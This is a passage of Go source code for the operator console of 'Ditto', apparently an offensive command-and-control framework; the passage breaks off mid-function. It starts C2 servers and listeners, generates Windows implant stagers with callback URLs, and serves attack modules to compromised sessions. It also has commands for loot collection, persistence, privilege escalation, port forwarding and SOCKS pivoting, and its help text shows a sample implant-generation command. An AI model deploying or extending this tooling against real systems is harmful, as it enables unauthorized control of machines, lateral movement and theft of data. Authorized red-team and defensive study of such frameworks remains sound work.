package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ditto/ditto/banner"
	"github.com/ditto/ditto/certificates"
	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/database"
	"github.com/ditto/ditto/interactive"
	"github.com/ditto/ditto/jobs"
	"github.com/ditto/ditto/loot"
	"github.com/ditto/ditto/modules"
	"github.com/ditto/ditto/payload"
	"github.com/ditto/ditto/persistence"
	"github.com/ditto/ditto/pivoting"
	"github.com/ditto/ditto/privesc"
	"github.com/ditto/ditto/reactions"
	"github.com/ditto/ditto/tasks"
	"github.com/ditto/ditto/transport"
	"github.com/jedib0t/go-pretty/v6/table"
)

// InteractiveServer manages the interactive server CLI
type InteractiveServer struct {
	logger              *core.Logger
	config              *core.Config
	server              *transport.Server
	serverRunning       bool
	serverMu            sync.RWMutex
	jobManager          *jobs.JobManager
	sessionMgr          *core.SessionManager
	moduleRegistry      *modules.ModuleRegistry
	privescIntelligence *privesc.PrivescIntelligence
	currentSession      string
	lootManager         *loot.LootManager
	pivotManager        *pivoting.PortForwardManager
	socksManager        *pivoting.SOCKS5Manager
	persistManager      *persistence.Installer
	reactionMgr         *reactions.ReactionManager
	taskQueue           *tasks.Queue // Shared task queue for all components
	completer           *interactive.Completer
	input               interactive.InputReader
	syncCancel          context.CancelFunc                  // Context cancel function for syncSessions goroutine
	httpTransports      map[string]*transport.HTTPTransport // Map of addr -> HTTPTransport for session syncing
	httpTransportsMu    sync.RWMutex                        // Mutex for httpTransports map
	markTaskPending     func(string)                         // Function to mark task as pending for auto-display
}

// NewInteractiveServer creates a new interactive server
func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveServer {
	moduleRegistry := modules.NewModuleRegistry(logger)

	// Create shared task queue for all components
	sharedTaskQueue := tasks.NewQueue(1000)

	completer := interactive.NewCompleter()

	// Set module registry for autocomplete
	moduleCompleterAdapter := modules.NewCompleterAdapter(moduleRegistry)
	completer.SetModuleRegistry(moduleCompleterAdapter)

	is := &InteractiveServer{
		logger:              logger,
		config:              cfg,
		jobManager:          jobs.NewJobManager(),
		sessionMgr:          core.NewSessionManager(),
		moduleRegistry:      moduleRegistry,
		privescIntelligence: privesc.NewPrivescIntelligence(moduleRegistry),
		lootManager:         loot.NewLootManager(logger),
		pivotManager:        pivoting.NewPortForwardManager(),
		socksManager:        pivoting.NewSOCKS5Manager(),
		persistManager:      nil, // Created per-installation
		reactionMgr:         reactions.NewReactionManager(logger),
		taskQueue:           sharedTaskQueue,
		completer:           completer,
		httpTransports:      make(map[string]*transport.HTTPTransport),
	}

	// Initialize readline input (fallback to simple input if readline fails)
	rlInput, err := interactive.NewReadlineInputWithCompleter("[ditto] > ", completer)
	if err != nil {
		logger.Warn("Failed to initialize readline, using simple input: %v", err)
		is.input = interactive.NewFallbackInput("[ditto] > ")
	} else {
		is.input = rlInput
	}

	// Restore listener jobs from database
	is.restoreListenerJobs()

	// Start event-driven automation (logging, host management, etc.)
	is.startEventHandlers()

	// Auto-load modules from modules/empire directory
	modulesPath := "modules/empire"
	if err := moduleRegistry.LoadModulesFromDirectory(modulesPath); err != nil {
		logger.Warn("Failed to load modules from %s: %v", modulesPath, err)
	} else {
		logger.Info("Loaded modules from %s", modulesPath)
	}

	return is
}

// startEventHandlers starts event-driven handlers for logging and automation
func (is *InteractiveServer) startEventHandlers() {
	events := core.EventBroker.Subscribe()
	if events == nil {
		// Broker stopped or unavailable
		is.logger.Error("Failed to subscribe to EventBroker")
		return
	}
	
	// Track pending tasks for current session to auto-display results
	pendingTasks := make(map[string]bool) // taskID -> isWaiting
	var pendingMu sync.Mutex
	
	go func() {
		defer func() {
			if events != nil {
				core.EventBroker.Unsubscribe(events) // Cleanup on exit
			}
		}()
		for event := range events {
			// Event logging
			is.logger.Debug("Event: %s", event.EventType)

			// Handle task completion events - auto-display results
			if event.Task != nil {
				taskID := ""
				if id, ok := event.Metadata["task_id"].(string); ok {
					taskID = id
				}
				
				pendingMu.Lock()
				shouldDisplay := pendingTasks[taskID]
				if shouldDisplay {
					delete(pendingTasks, taskID) // Remove from pending
				}
				pendingMu.Unlock()
				
				if shouldDisplay && taskID != "" {
					// Auto-display result for tasks we're waiting on
					if resultValue, ok := event.Metadata["result"].(string); ok {
						fmt.Printf("\n[*] Task %s completed:\n", shortTaskID(taskID))
						if strings.Contains(strings.ToLower(resultValue), "error:") {
							fmt.Printf("[!] %s\n", resultValue)
						} else {
							fmt.Println(resultValue)
						}
						// Restore prompt
						if is.input != nil {
							is.input.SetPrompt(getPrompt(is.currentSession))
						}
					}
				}
			}

			// Log session events
			if event.Session != nil {
				// Use getter methods for thread safety
				sessionID := shortID(event.Session.GetID())
				sessionType := string(event.Session.GetType())
				remoteAddr := event.Session.GetRemoteAddr()

				switch event.EventType {
				case core.EventSessionOpened:
					is.logger.Info("Session opened: %s (%s) from %s",
						sessionID, sessionType, remoteAddr)
				case core.EventSessionClosed:
					is.logger.Info("Session closed: %s", sessionID)
				case core.EventSessionKilled:
					is.logger.Info("Session killed: %s", sessionID)
				case core.EventSessionPrivilegeChanged:
					oldPriv := event.Metadata["old_privilege"]
					newPriv := event.Metadata["new_privilege"]
					is.logger.Info("Session privilege changed: %s (%s -> %s)",
						sessionID, oldPriv, newPriv)
				}
			}
		}
	}()
	
	// Helper function to mark task as pending
	is.markTaskPending = func(taskID string) {
		pendingMu.Lock()
		pendingTasks[taskID] = true
		pendingMu.Unlock()
	}
}

func (is *InteractiveServer) restoreListenerJobs() {
	listenerJobs, err := database.GetListenerJobs()
	if err != nil {
		is.logger.Error("Failed to restore listener jobs: %v", err)
		return
	}

	// Don't mark jobs as stopped on startup - keep their status
	// They will be auto-started when server starts if they were running
	is.logger.Debug("Found %d persistent listener jobs", len(listenerJobs))
}

// startPersistentJobs starts all persistent jobs that were running before server restart
func (is *InteractiveServer) startPersistentJobs() {
	if !is.isServerRunning() {
		return // Don't start jobs if server isn't running
	}

	listenerJobs, err := database.GetListenerJobs()
	if err != nil {
		is.logger.Error("Failed to get listener jobs for restoration: %v", err)
		return
	}

	for _, dbJob := range listenerJobs {
		// Auto-start jobs that were running before server restart
		if dbJob.Status == "running" {
			// Reconstruct address
			addr := fmt.Sprintf("%s:%d", dbJob.Host, dbJob.Port)

			// Start the listener
			is.logger.Info("Auto-starting persistent listener: %s on %s", dbJob.Type, addr)
			if err := is.startListenerJob(dbJob.Type, addr, dbJob); err != nil {
				is.logger.Error("Failed to auto-start listener %s on %s: %v", dbJob.Type, addr, err)
				// Mark as stopped since it failed to start
				dbJob.Status = "stopped"
				database.UpdateListenerJob(dbJob)
			}
		}
	}
}

// startListenerJob starts a listener job from database record
func (is *InteractiveServer) startListenerJob(listenerType, addr string, dbJob *database.ListenerJob) error {
	// Use the existing handleListen logic but with the database job info
	jobName := fmt.Sprintf("%s listener on %s", listenerType, addr)

	var startFunc func() error
	switch listenerType {
	case "http":
		startFunc = is.startHTTPListener(addr, jobName)
	case "https":
		startFunc = is.startHTTPSListener(addr, jobName)
	case "mtls":
		startFunc = is.startMTLSListener(addr, jobName)
	default:
		return fmt.Errorf("unsupported listener type: %s", listenerType)
	}

	// Add job to manager
	job := is.jobManager.AddJob(jobs.JobTypeListener, jobName, startFunc)

	// Update database job with new JobID and status
	dbJob.JobID = job.ID
	dbJob.Status = "running"
	if err := database.UpdateListenerJob(dbJob); err != nil {
		is.logger.Error("Failed to update listener job status: %v", err)
	}

	// Start the listener in background
	go func() {
		if err := startFunc(); err != nil {
			is.logger.Error("Listener %s failed: %v", jobName, err)
			// Mark as stopped in database
			dbJob.Status = "stopped"
			database.UpdateListenerJob(dbJob)
			is.jobManager.StopJob(job.ID)
		}
	}()

	is.logger.Info("Auto-started persistent listener: %s (Job ID: %d)", jobName, job.ID)
	return nil
}

// Run starts the interactive server CLI
func (is *InteractiveServer) Run() {
	defer func() {
		// Cleanup on exit
		if is.input != nil {
			is.input.Close()
		}
		// Stop reaction manager (unsubscribes from EventBroker)
		if is.reactionMgr != nil {
			is.reactionMgr.Stop()
		}
	}()

	banner.PrintDittoBanner()
	fmt.Println("Ditto Interactive Server")
	fmt.Println("Type 'help' for available commands")
	fmt.Println()

	for {
		// Update prompt based on current session
		prompt := getPrompt(is.currentSession)
		if is.input == nil {
			fmt.Printf("[!] Error: input handler not initialized\n")
			break
		}

		is.input.SetPrompt(prompt)

		line, err := is.input.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			fmt.Printf("[!] Error reading input: %v\n", err)
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		// Normalize command to lowercase for consistent matching
		command = strings.ToLower(command)

		// Validate command before executing (with visual feedback)
		if is.completer == nil || !is.completer.IsValidCommand(command) {
			fmt.Printf("[!] Unknown command: %s\nType 'help' for available commands.\n", command)
			continue
		}

		// Visual feedback: highlight valid command (optional - can be enabled for verbose mode)
		// For now, we validate silently, but the completer provides tab completion hints

		if err := is.handleCommand(command, args); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
	}
}

func (is *InteractiveServer) handleCommand(cmd string, args []string) error {
	switch cmd {
	case "help", "h", "?":
		is.printHelp()
	case "server", "srv", "s":
		return is.handleServer(args)
	case "stop-server", "stop":
		return is.handleStopServer()
	case "jobs", "j":
		return is.handleJobs(args)
	case "kill", "k":
		return is.handleKill(args)
	case "generate", "gen", "g":
		return is.handleGenerate(args)
	case "sessions", "sess":
		is.printSessions()
	case "use", "u":
		return is.handleUse(args)
	case "listen", "l":
		return is.handleListen(args)
	case "port-forward", "pf":
		return is.handlePortForward(args)
	case "socks5":
		return is.handleSOCKS5(args)
	case "loot":
		return is.handleLoot(args)
	case "persist":
		return is.handlePersistence(args)
	case "implants":
		return is.handleImplants(args)
	case "implant", "get-implant":
		return is.handleGetImplant(args)
	case "version", "v":
		fmt.Printf("Ditto v%s\nBuild: %s\nCommit: %s\n", version, buildTime, gitCommit)
	case "clear", "cls":
		fmt.Print("\033[H\033[2J")
		banner.PrintDittoBanner()
	case "modules":
		allModules := is.moduleRegistry.ListAllModules()
		if len(allModules) == 0 {
			fmt.Println("[*] No modules loaded")
			fmt.Println("    Modules are loaded automatically from modules/ directory")
			return nil
		}

		fmt.Printf("[*] Available modules (%d total):\n\n", len(allModules))

		// Group by category
		byCategory := make(map[string][]*modules.EmpireModule)
		for _, mod := range allModules {
			category := string(mod.Category)
			byCategory[category] = append(byCategory[category], mod)
		}

		// Display grouped by category
		for category, mods := range byCategory {
			fmt.Printf("  %s:\n", category)
			for _, mod := range mods {
				fmt.Printf("    %s - %s\n", mod.ID, mod.Name)
			}
			fmt.Println()
		}

		fmt.Println("[*] Use 'module <id>' in a session to execute a module")
	case "sync-sessions":
		is.syncSessions()
		fmt.Println("[+] Sessions synced from server")
	case "exit", "quit", "q":
		if is.isServerRunning() {
			return fmt.Errorf("server is running - stop it first with 'stop-server' or 'server stop'\n" +
				"  Usage: server stop\n" +
				"  Note: You cannot exit while the server is running")
		}
		fmt.Println("Exiting Ditto...")
		os.Exit(0)
	default:
		fmt.Printf("[!] Unknown command: %s\nType 'help' for available commands.\n", cmd)
	}
	return nil
}

func (is *InteractiveServer) printHelp() {
	help := `
Available Commands:
  Server Management:
    server, srv, s                  Start C2 server with default address (0.0.0.0:8443)
    server <addr>                   Start C2 server with specified address
    server start                   Start C2 server with default address
    server start <addr>            Start C2 server with specified address
    server stop                     Stop the running server
    server status                   Show server status
    stop-server, stop               Stop the running server (alias)
    
  Jobs & Listeners:
    jobs, j                         List all active jobs/listeners
    listen, l <type> <addr>         Start a listener (http, https, mtls)
                                    Example: listen http 0.0.0.0:8080
    kill, k <job_id>                Stop a job by ID
    
  Pivoting:
    port-forward, pf                Create port forward through session
                                    Usage: port-forward <session_id> <local> <remote>
    socks5                          Start SOCKS5 proxy through session
                                    Usage: socks5 <session_id> <bind_addr> [user] [pass]
    
  Loot Management:
    loot list                       List all loot items
    loot add <type> <name> <data>   Add loot item
    loot get <id>                   Get loot item details
    loot remove <id>                Remove loot item
    loot export                     Export all loot as JSON
    
  Persistence:
    persist install <session>       Install persistence on session
    persist remove <session>        Remove persistence from session
    
  Implants:
    implants                        List all saved implant builds
    implant <id>                    Get implant build details by ID
    
         Implant Generation:
           generate, gen, g              Generate implant
                                         Usage: generate <type> <os> <arch> [options]
                                         Options:
                                           --callback, -c <url>     Callback URL (http://host:port)
                                           --delay, -d <sec>        Beacon delay (default: 10)
                                           --jitter, -j <0.0-1.0>   Jitter percentage
                                           --output, -o <path>      Output file path
                                         Example: generate full windows amd64 --callback http://192.168.1.100:8443
                               
  Session Management:
    sessions, sess                  List all active sessions
    use, u <session_id>            Interact with a session
    
  Utilities:
    version, v                      Show version information
    clear, cls                      Clear screen
    exit, quit, q                  Exit Ditto
`
	fmt.Println(help)
}

func (is *InteractiveServer) handleServer(args []string) error {
	// Handle subcommands
	if len(args) > 0 {
		subcommand := args[0]
		switch subcommand {
		case "start":
			// server start [address]
			listenAddr := "0.0.0.0:8443"
			if len(args) > 1 {
				listenAddr = args[1]
			}
			return is.startServer(listenAddr)
		case "stop":
			return is.handleStopServer()
		case "status", "info":
			return is.handleServerStatus()
		default:
			// If it's not a subcommand, treat as address
			// Check if it looks like an address (contains :)
			if strings.Contains(subcommand, ":") {
				return is.startServer(subcommand)
			}
			// Otherwise, show help
			return fmt.Errorf("unknown server subcommand '%s'\n"+
				"  Usage:\n"+
				"    server                    Start server with default address (0.0.0.0:8443)\n"+
				"    server <address>          Start server with specified address\n"+
				"    server start              Start server with default address\n"+
				"    server start <address>    Start server with specified address\n"+
				"    server stop               Stop the running server\n"+
				"    server status             Show server status\n"+
				"  Examples:\n"+
				"    server\n"+
				"    server 0.0.0.0:8443\n"+
				"    server start\n"+
				"    server start 127.0.0.1:8080\n"+
				"    server stop\n"+
				"    server status", subcommand)
		}
	}

	// No arguments - start with default address
	return is.startServer("0.0.0.0:8443")
}

// startServer starts the C2 server with the given address
func (is *InteractiveServer) startServer(listenAddr string) error {
	if is.isServerRunning() {
		return fmt.Errorf("server is already running\n" +
			"  Use 'server stop' to stop the current server\n" +
			"  Use 'server status' to check server status")
	}

	// Validate address format
	if err := validateAddress(listenAddr); err != nil {
		return fmt.Errorf("invalid server address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8443, 127.0.0.1:8080, localhost:443\n"+
			"  Note: Port must be between 1 and 65535", listenAddr, err)
	}

	fmt.Printf("[*] Starting C2 server on %s...\n", listenAddr)

	is.server = transport.NewServerWithTaskQueue(is.config, is.logger, is.taskQueue)

	// Set up stager getter for getsystemsafe
	is.server.SetStagerGetter(func(callbackURL string) ([]byte, error) {
		gen := payload.NewGenerator(is.logger, is.moduleRegistry)
		opts := payload.Options{
			Type:        "full",
			OS:          "windows",
			Arch:        "amd64",
			CallbackURL: callbackURL,
			Delay:       5,
			Jitter:      0.3,
			Config:      is.config,
			Debug:       false,
		}
		return gen.Generate(opts)
	})

	// Channel to track server startup errors
	startupErr := make(chan error, 1)

	// Start server in background
	go func() {
		is.setServerRunning(true)
		if err := is.server.Start(listenAddr); err != nil {
			is.setServerRunning(false)
			startupErr <- err
			return
		}
		// Server stopped normally
		is.setServerRunning(false)
		// Mark all running jobs as stopped when server stops
		is.markAllJobsAsStopped()
		startupErr <- nil
	}()

	// Sync server sessions periodically
	// Cancel any existing sync goroutine first
	if is.syncCancel != nil {
		is.syncCancel()
		is.syncCancel = nil
	}
	ctx, cancel := context.WithCancel(context.Background())
	is.syncCancel = cancel
	go is.syncSessionsWithContext(ctx)

	// Give server time to start and check for immediate errors
	select {
	case err := <-startupErr:
		if err != nil {
			is.setServerRunning(false)
			return fmt.Errorf("server failed to start: %w", err)
		}
		// Server stopped before we could check (shouldn't happen)
		return fmt.Errorf("server stopped unexpectedly")
	case <-time.After(500 * time.Millisecond):
		// Server appears to be running (no immediate error)
		if !is.isServerRunning() {
			return fmt.Errorf("server failed to start")
		}
		fmt.Printf("[+] Server started successfully on %s\n", listenAddr)
		fmt.Println("[*] Press Ctrl+C or use 'stop-server' to stop")

		// Start persistent jobs that were running before
		is.startPersistentJobs()
		return nil
	}
}

// handleServerStatus shows the current server status
func (is *InteractiveServer) handleServerStatus() error {
	if !is.isServerRunning() {
		fmt.Println("[*] Server status: NOT RUNNING")
		return nil
	}

	fmt.Println("[*] Server status: RUNNING")
	if is.server == nil {
		fmt.Println("[!] Warning: Server marked as running but server instance is nil")
		return nil
	}

	// Try to get server address from config or server
	fmt.Println("[*] Press Ctrl+C or use 'stop-server' to stop")

	// Show session count
	sessions := is.server.GetSessions()
	fmt.Printf("[*] Active sessions: %d\n", len(sessions))

	return nil
}

func (is *InteractiveServer) handleStopServer() error {
	if !is.isServerRunning() {
		return fmt.Errorf("server is not running\n" +
			"  Use 'server start' or 'server <address>' to start the server\n" +
			"  Use 'server status' to check server status")
	}

	fmt.Println("[*] Stopping server...")

	// Stop sync goroutine
	if is.syncCancel != nil {
		is.syncCancel()
		is.syncCancel = nil
	}

	// Stop the server
	if is.server != nil {
		if err := is.server.Stop(); err != nil {
			is.logger.Error("Error stopping server: %v", err)
		}
	}

	// Mark all running jobs as stopped when server stops
	is.markAllJobsAsStopped()

	is.setServerRunning(false)

	// Stop all listeners
	for _, job := range is.jobManager.ListJobs() {
		if job.Type == jobs.JobTypeListener {
			is.jobManager.StopJob(job.ID)
		}
	}

	fmt.Println("[+] Server stopped")
	return nil
}

func (is *InteractiveServer) handleListen(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: listen <type> <addr>\n" +
			"  Valid types: http, https, mtls\n" +
			"  Example: listen http 0.0.0.0:8080\n" +
			"  Example: listen https 0.0.0.0:8443\n" +
			"  Example: listen mtls 0.0.0.0:9090")
	}

	listenerType := strings.ToLower(args[0])
	addr := args[1]

	// Validate listener type
	validTypes := map[string]bool{"http": true, "https": true, "mtls": true}
	if !validTypes[listenerType] {
		return fmt.Errorf("invalid listener type '%s'\n"+
			"  Valid types: http, https, mtls\n"+
			"  Usage: listen <type> <address>\n"+
			"  Examples:\n"+
			"    listen http 0.0.0.0:8080\n"+
			"    listen https 0.0.0.0:8443\n"+
			"    listen mtls 0.0.0.0:9090", listenerType)
	}

	// Validate address format
	if err := validateAddress(addr); err != nil {
		return fmt.Errorf("invalid listener address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8080, 127.0.0.1:8443\n"+
			"  Note: Port must be between 1 and 65535", addr, err)
	}

	// Ensure server is running
	if !is.isServerRunning() {
		return fmt.Errorf("server is not running - you must start the C2 server first\n" +
			"  Usage: server [<address>]\n" +
			"  Example: server 0.0.0.0:8443\n" +
			"  Note: The server must be running before you can start listeners")
	}

	jobName := fmt.Sprintf("%s listener on %s", listenerType, addr)

	var stopFunc func() error

	switch listenerType {
	case "http":
		stopFunc = is.startHTTPListener(addr, jobName)
	case "https":
		stopFunc = is.startHTTPSListener(addr, jobName)
	case "mtls":
		stopFunc = is.startMTLSListener(addr, jobName)
	default:
		return fmt.Errorf("unknown listener type: %s", listenerType)
	}

	if stopFunc == nil {
		return fmt.Errorf("failed to start %s listener on %s\n"+
			"  Possible causes:\n"+
			"    - Port already in use\n"+
			"    - Insufficient permissions\n"+
			"    - Certificate issues (for https/mtls)\n"+
			"  Check server logs for details", listenerType, addr)
	}

	job := is.jobManager.AddJob(jobs.JobTypeListener, jobName, stopFunc)
	job.Metadata["type"] = listenerType
	job.Metadata["addr"] = addr

	// Persist listener job to database
	if err := is.saveListenerJobToDB(job, listenerType, addr); err != nil {
		is.logger.Error("Failed to save listener job to database: %v", err)
		// Continue anyway - job is still active
	}

	fmt.Printf("[+] Started %s (Job ID: %d)\n", jobName, job.ID)
	return nil
}

func (is *InteractiveServer) saveListenerJobToDB(job *jobs.Job, listenerType, addr string) error {
	// Parse address
	host, portStr := "", uint32(0)
	if parts := strings.Split(addr, ":"); len(parts) == 2 {
		host = parts[0]
		if p, err := strconv.ParseUint(parts[1], 10, 32); err == nil {
			portStr = uint32(p)
		}
	}

	// Check if listener already exists in database by address (unique identifier)
	existingJob, err := database.GetListenerJobByAddress(listenerType, host, portStr)
	if err == nil && existingJob != nil {
		// If it's marked as running, check if it's actually running
		if existingJob.Status == "running" {
			// Check if job actually exists in job manager
			activeJob := is.jobManager.GetJob(existingJob.JobID)
			if activeJob == nil {
				// Job is marked as running but not actually running - update it
				existingJob.JobID = uint64(job.ID)
				existingJob.Status = "running"
				existingJob.CertPath = is.config.Server.TLSCertPath
				existingJob.KeyPath = is.config.Server.TLSKeyPath
				existingJob.Secure = listenerType == "https" || listenerType == "mtls"

				if err := database.UpdateListenerJob(existingJob); err != nil {
					return fmt.Errorf("failed to update listener job in database: %w\n"+
						"  Note: Listener may still be running, but state won't persist", err)
				}
				return nil
			}
			// Job is actually running - can't start another on same address
			return fmt.Errorf("listener already exists and is running: %s on %s:%d\n"+
				"  If the listener is not actually running, mark it as stopped first\n"+
				"  Or use a different address/port", listenerType, host, portStr)
		}

		// Update existing stopped job to running
		existingJob.JobID = uint64(job.ID)
		existingJob.Status = "running"
		existingJob.CertPath = is.config.Server.TLSCertPath
		existingJob.KeyPath = is.config.Server.TLSKeyPath
		existingJob.Secure = listenerType == "https" || listenerType == "mtls"

		if err := database.UpdateListenerJob(existingJob); err != nil {
			return fmt.Errorf("failed to update listener job in database: %w\n"+
				"  Note: Listener may still be running, but state won't persist", err)
		}
		return nil
	}

	// Create new listener job
	listenerJob := &database.ListenerJob{
		JobID:    uint64(job.ID),
		Type:     listenerType,
		Host:     host,
		Port:     portStr,
		Secure:   listenerType == "https" || listenerType == "mtls",
		CertPath: is.config.Server.TLSCertPath,
		KeyPath:  is.config.Server.TLSKeyPath,
		Status:   "running",
	}

	if err := database.SaveListenerJob(listenerJob); err != nil {
		return fmt.Errorf("failed to save listener job to database: %w\n"+
			"  Note: Listener may still be running, but state won't persist", err)
	}

	return nil
}

// markAllJobsAsStopped marks all running jobs in database as stopped
func (is *InteractiveServer) markAllJobsAsStopped() {
	dbJobs, err := database.GetListenerJobs()
	if err != nil {
		is.logger.Error("Failed to get listener jobs for marking as stopped: %v", err)
		return
	}

	for _, dbJob := range dbJobs {
		if dbJob.Status == "running" {
			dbJob.Status = "stopped"
			if updateErr := database.UpdateListenerJob(dbJob); updateErr != nil {
				is.logger.Error("Failed to mark job as stopped: %v", updateErr)
			}
		}
	}
}

func (is *InteractiveServer) startHTTPListener(addr, jobName string) func() error {
	httpTransport := transport.NewHTTPTransportWithTaskQueue(is.config, is.logger, is.taskQueue)

	// Store transport reference for session syncing
	is.httpTransportsMu.Lock()
	is.httpTransports[addr] = httpTransport
	is.httpTransportsMu.Unlock()

	// Set module getter for the transport with parameter support
	httpTransport.SetModuleGetterWithParams(func(moduleID string, params map[string]string) (string, error) {
		module, ok := is.moduleRegistry.GetModuleByPath(moduleID)
		if !ok {
			module, ok = is.moduleRegistry.GetModule(moduleID)
		}
		if !ok {
			return "", fmt.Errorf("module not found: %s", moduleID)
		}

		// Handle BOF modules differently
		if module.Language == modules.LanguageBOF {
			return is.processBOFModule(module, params)
		}

		// Process module with provided params (or empty if none)
		if params == nil {
			params = make(map[string]string)
		}
		script, err := modules.ProcessModule(module, params)
		if err != nil {
			return "", fmt.Errorf("failed to process module: %w", err)
		}

		return script, nil
	})

	httpTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   false,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}

	ctx := context.Background()
	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
		is.logger.Error("Failed to start HTTP listener: %v", err)
		is.httpTransportsMu.Lock()
		delete(is.httpTransports, addr)
		is.httpTransportsMu.Unlock()
		return nil // Return nil func to indicate failure
	}

	return func() error {
		is.logger.Info("Stopping HTTP listener: %s", jobName)
		is.httpTransportsMu.Lock()
		delete(is.httpTransports, addr)
		is.httpTransportsMu.Unlock()
		return httpTransport.Stop()
	}
}

func (is *InteractiveServer) startHTTPSListener(addr, jobName string) func() error {
	// Ensure certificates exist, generate if needed
	certPath := is.config.Server.TLSCertPath
	keyPath := is.config.Server.TLSKeyPath

	if certPath == "" || keyPath == "" {
		// Generate default paths
		certPath = "./certs/server.crt"
		keyPath = "./certs/server.key"
		is.config.Server.TLSCertPath = certPath
		is.config.Server.TLSKeyPath = keyPath
	}

	// Check if certificates exist
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		is.logger.Info("Certificates not found, generating...")
		cm := certificates.NewCAManager(is.logger)

		// Generate CA first
		if err := cm.GenerateCA("Ditto CA"); err != nil {
			is.logger.Error("Failed to generate CA: %v", err)
			return nil
		}

		// Generate server certificate
		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
		if err != nil {
			is.logger.Error("Failed to generate certificate: %v", err)
			return nil
		}

		// Ensure cert directory exists
		certDir := filepath.Dir(certPath)
		if err := os.MkdirAll(certDir, 0755); err != nil {
			is.logger.Error("Failed to create cert directory: %v", err)
			return nil
		}

		// Write certificates
		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
			is.logger.Error("Failed to write certificate: %v", err)
			return nil
		}
		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
			is.logger.Error("Failed to write key: %v", err)
			return nil
		}

		is.logger.Info("Certificates generated successfully")
	}

	httpTransport := transport.NewHTTPTransportWithTaskQueue(is.config, is.logger, is.taskQueue)

	// Store transport reference for session syncing
	is.httpTransportsMu.Lock()
	is.httpTransports[addr] = httpTransport
	is.httpTransportsMu.Unlock()

	// Set module getter for the transport with parameter support
	httpTransport.SetModuleGetterWithParams(func(moduleID string, params map[string]string) (string, error) {
		module, ok := is.moduleRegistry.GetModuleByPath(moduleID)
		if !ok {
			module, ok = is.moduleRegistry.GetModule(moduleID)
		}
		if !ok {
			return "", fmt.Errorf("module not found: %s", moduleID)
		}

		// Handle BOF modules differently
		if module.Language == modules.LanguageBOF {
			return is.processBOFModule(module, params)
		}

		// Process module with provided params (or empty if none)
		if params == nil {
			params = make(map[string]string)
		}
		script, err := modules.ProcessModule(module, params)
		if err != nil {
			return "", fmt.Errorf("failed to process module: %w", err)
		}

		return script, nil
	})

	httpTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   true,
		TLSCertPath:  certPath,
		TLSKeyPath:   keyPath,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}

	ctx := context.Background()
	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
		is.logger.Error("Failed to start HTTPS listener: %v", err)
		is.httpTransportsMu.Lock()
		delete(is.httpTransports, addr)
		is.httpTransportsMu.Unlock()
		return nil
	}

	return func() error {
		is.logger.Info("Stopping HTTPS listener: %s", jobName)
		is.httpTransportsMu.Lock()
		delete(is.httpTransports, addr)
		is.httpTransportsMu.Unlock()
		return httpTransport.Stop()
	}
}

func (is *InteractiveServer) startMTLSListener(addr, jobName string) func() error {
	// Ensure certificates exist, generate if needed
	certPath := is.config.Server.TLSCertPath
	keyPath := is.config.Server.TLSKeyPath

	if certPath == "" || keyPath == "" {
		// Generate default paths
		certPath = "./certs/server.crt"
		keyPath = "./certs/server.key"
		is.config.Server.TLSCertPath = certPath
		is.config.Server.TLSKeyPath = keyPath
	}

	// Check if certificates exist
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		is.logger.Info("Certificates not found, generating...")
		cm := certificates.NewCAManager(is.logger)

		// Generate CA first
		if err := cm.GenerateCA("Ditto CA"); err != nil {
			is.logger.Error("Failed to generate CA: %v", err)
			return nil
		}

		// Generate server certificate
		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
		if err != nil {
			is.logger.Error("Failed to generate certificate: %v", err)
			return nil
		}

		// Ensure cert directory exists
		certDir := filepath.Dir(certPath)
		if err := os.MkdirAll(certDir, 0755); err != nil {
			is.logger.Error("Failed to create cert directory: %v", err)
			return nil
		}

		// Write certificates
		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
			is.logger.Error("Failed to write certificate: %v", err)
			return nil
		}
		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
			is.logger.Error("Failed to write key: %v", err)
			return nil
		}

		is.logger.Info("Certificates generated successfully")
	}

	mtlsTransport := transport.NewmTLSTransportWithTaskQueue(is.config, is.logger, is.taskQueue)

	mtlsTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   true,
		TLSCertPath:  certPath,
		TLSKeyPath:   keyPath,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}

	ctx := context.Background()
	if err := mtlsTransport.Start(ctx, mtlsTransportConfig); err != nil {
		is.logger.Error("Failed to start mTLS listener: %v", err)
		return nil
	}

	return func() error {
		is.logger.Info("Stopping mTLS listener: %s", jobName)
		return mtlsTransport.Stop()
	}
}

func (is *InteractiveServer) handleKill(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: kill <job_id>\n" +
			"  Use 'jobs' command to list all active jobs with their IDs\n" +
			"  Example: kill 1")
	}

	jobID, err := strconv.ParseUint(args[0], 10, 64)
	if err != nil {
		return fmt.Errorf("invalid job ID '%s': must be a number\n"+
